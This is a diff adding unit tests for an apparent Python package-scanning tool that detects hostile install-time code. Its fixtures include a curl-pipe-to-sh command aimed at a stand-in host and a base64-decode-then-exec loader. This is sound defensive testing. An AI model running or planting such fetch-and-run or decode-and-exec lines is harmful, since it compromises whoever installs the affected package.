@@ -405,3 +405,82 @@ def test_file_references():
     refs = file_references("exec(open('a/b.py').read())\nrunpy.run_path('c.py')\n"
                            "subprocess.call(['sh', 'install.sh'])")
     assert {"a/b.py", "c.py", "install.sh"} <= refs
+
+
+def test_reversing_a_list_isnt_decoding():
+    code = "import subprocess\nshape = dims[::-1]\nsubprocess.run(['echo', *shape])"
+    assert "exec-decoded" not in rules(code, role="setup")
+
+
+def test_files_that_are_only_read_arent_followed():
+    from pkg_sentry.pyscan import file_references
+    code = ("long_description = open('README.rst').read()\n"
+            "with open('pkg/__init__.py') as f:\n    version = f.read()\n"
+            "cmd = ['sh', 'build/run.sh']\nsubprocess.check_call(cmd)\n")
+    assert file_references(code) == {"build/run.sh"}
+
+
+def test_used_imports():
+    from pkg_sentry.pyscan import used_imports
+    code = ("from helpers import go, VERSION\nimport tools.build as tb\nimport stamp\n"
+            "class Install(stamp.Base): pass\n"
+            "def later():\n    tb.compile_all()\n"
+            "go()\nsetup(version=VERSION, cmdclass={'install': Install})\n")
+    assert {(0, "helpers.go"), (0, "stamp.Base")} <= used_imports(code, everywhere=False)
+    assert (0, "helpers.VERSION") not in used_imports(code)
+    assert (0, "tools.build") not in used_imports(code, everywhere=False)
+    assert (0, "tools.build") in used_imports(code)
+
+
+def test_text_hits_at_module_level_count_as_install_time_on_import():
+    code = '''
+import os
+os.system("curl -s https://x.example/a | sh")
+try:
+    def later():
+        os.system("curl -s https://x.example/b | sh")
+except ImportError:
+    pass
+'''
+    found = [(f.rule, f.line, f.critical) for f in scan_python("pkg/m.py", code, "import")
+             if f.rule == "download-exec"]
+    assert ("download-exec", 3, True) in found
+    assert ("download-exec", 6, False) in found
+
+
+def test_decoding_into_an_attribute_doesnt_taint_self():
+    code = '''
+import base64, subprocess
+class Token:
+    def load(self, content):
+        self._data = base64.b64decode(content).decode()
+    def run(self):
+        subprocess.Popen([self._cmd] + self._args)
+'''
+    assert "exec-decoded" not in rules(code)
+
+
+def test_decoded_data_kept_on_an_attribute_is_still_followed():
+    code = '''
+import base64
+class Loader:
+    def __init__(self, blob):
+        self.payload = base64.b64decode(blob)
+        exec(self.payload)
+'''
+    assert "exec-decoded" in rules(code, role="setup")
+
+
+def test_commands_pip_never_runs_arent_followed():
+    from pkg_sentry.pyscan import file_references
+    code = '''
+import subprocess
+class import_data(Command):
+    def run(self):
+        subprocess.check_call(["python", "scripts/download.py"])
+class build_stuff(Command):
+    def run(self):
+        subprocess.check_call(["sh", "scripts/build.sh"])
+setup(cmdclass={"import_data": import_data, "build_py": build_stuff})
+'''
+    assert file_references(code) == {"scripts/build.sh"}
